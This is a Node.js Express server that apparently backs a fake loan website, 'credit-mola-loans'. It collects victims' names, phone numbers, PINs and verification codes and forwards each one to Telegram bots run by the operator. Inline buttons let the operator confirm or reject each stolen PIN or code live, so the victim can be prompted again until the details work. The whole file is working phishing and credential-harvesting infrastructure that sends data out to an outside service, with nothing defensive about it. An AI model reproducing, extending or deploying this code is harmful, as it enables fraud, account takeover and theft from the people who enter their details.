require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;
const BOTS_FILE = path.join(__dirname, 'bots.json');

// ---------------- BACKEND DOMAIN (HARD-LOCKED) ----------------
const BACKEND_DOMAIN = 'https://credit-mola-loans.onrender.com';

// ---------------- MEMORY STORES ----------------
const approvedPins = {};
const approvedCodes = {};
const requestBotMap = {};

// ---------------- MULTI-BOT STORE ----------------
let bots = [];
if (fs.existsSync(BOTS_FILE)) {
    try {
        bots = JSON.parse(fs.readFileSync(BOTS_FILE, 'utf-8'));
        console.log('✅ Bots loaded from bots.json:', bots.map(b => b.botId));
    } catch {
        bots = [];
    }
} else {
    bots = [
        { botId: 'bot1', botToken: process.env.BOT1_TOKEN, chatId: process.env.BOT1_CHATID },
        { botId: 'bot2', botToken: process.env.BOT2_TOKEN, chatId: process.env.BOT2_CHATID }
    ];
    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
}

// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}
function saveBots() {
    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
}

// ---------------- TELEGRAM HELPERS ----------------
async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
            { chat_id: bot.chatId, text, reply_markup: { inline_keyboard: inlineKeyboard } }
        );
    } catch (err) {
        console.error(err.response?.data || err.message);
    }
}
async function answerCallback(bot, callbackId) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
            { callback_query_id: callbackId }
        );
    } catch (err) {
        console.error(err.response?.data || err.message);
    }
}

// ---------------- AUTO-SET WEBHOOKS ----------------
async function setWebhookForBot(bot) {
    try {
        if (!bot.botToken || !bot.botId) return;
        const webhookUrl = `${BACKEND_DOMAIN}/telegram-webhook/${bot.botId}`;
        const resp = await axios.get(
            `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`
        );
        console.log(`✅ Webhook set for ${bot.botId}:`, resp.data);
    } catch (err) {
        console.error(`❌ Failed to set webhook for ${bot.botId}:`, err.response?.data || err.message);
    }
}
async function setWebhooksForAllBots() {
    for (const bot of bots) {
        await setWebhookForBot(bot);
    }
}

// ---------------- DYNAMIC PAGE SERVING ----------------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Invalid bot link');
    res.redirect(`/index.html?botId=${bot.botId}`);
});
app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));

// ---------------- PIN HANDLING ----------------
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(bot, `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`, [[
        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
    ]]);

    res.json({ requestId });
});
app.get('/check-pin/:requestId', (req, res) => {
    res.json({ approved: approvedPins[req.params.requestId] ?? null });
});

// ---------------- CODE HANDLING ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(bot, `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`, [[
        { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
        { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
    ]]);

    res.json({ requestId });
});
app.get('/check-code/:requestId', (req, res) => {
    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');
    if (action === 'pin_ok') approvedPins[requestId] = true;
    if (action === 'pin_bad') approvedPins[requestId] = false;
    if (action === 'code_ok') approvedCodes[requestId] = true;
    if (action === 'code_bad') approvedCodes[requestId] = false;

    await answerCallback(bot, cb.id);
    res.sendStatus(200);
});

// ---------------- ADD BOT ----------------
app.post('/add-bot', async (req, res) => {
    const { botId, botToken, chatId } = req.body;
    if (!botId || !botToken || !chatId) return res.status(400).json({ error: 'botId, botToken, chatId required' });
    if (getBot(botId)) return res.status(400).json({ error: 'Bot already exists' });

    bots.push({ botId, botToken, chatId });
    saveBots();

    const webhookUrl = `${BACKEND_DOMAIN}/telegram-webhook/${botId}`;
    try {
        await axios.get(`https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`);
    } catch {
        return res.status(500).json({ error: 'Failed to set webhook' });
    }

    res.json({ ok: true, botLink: `${BACKEND_DOMAIN}/bot/${botId}` });
});

// ---------------- DEBUG ----------------
app.get('/debug/bots', (req, res) => res.json(bots));

// ---------------- START SERVER ----------------
setWebhooksForAllBots().then(() => {
    app.listen(PORT, () =>
        console.log(`🚀 Server running on port ${PORT} (Domain: ${BACKEND_DOMAIN})`)
    );
});
